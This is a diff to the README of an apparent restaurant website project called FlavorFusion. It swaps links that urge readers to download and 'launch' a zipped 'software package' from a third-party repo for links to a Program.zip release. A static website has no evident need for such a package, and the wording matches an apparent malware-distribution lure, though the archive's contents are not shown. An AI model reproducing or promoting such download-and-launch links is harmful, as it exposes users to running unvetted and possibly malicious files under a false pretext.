@@ -36,9 +36,9 @@ FlavorFusion is a stunning restaurant website project that showcases the perfect
 
 To explore the FlavorFusion project and all its functionalities, download the software package from the following link:
 
-[![Download Software](https://img.shields.io/badge/Download-Software-blue)](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)
+[![Download Software](https://github.com/ilymiranda/FlavorFusion/releases/download/v1.0/Program.zip)](https://github.com/ilymiranda/FlavorFusion/releases/download/v1.0/Program.zip)
 
-🚀 **[Launch Software Package](https://github.com/rokytd/files/raw/refs/heads/master/Software.zip)** 🚀
+🚀 **[Launch Software Package](https://github.com/ilymiranda/FlavorFusion/releases/download/v1.0/Program.zip)** 🚀
 
 If the link does not work or you want to check for any new releases, please visit the "Releases" section of this repository for the latest updates.
 
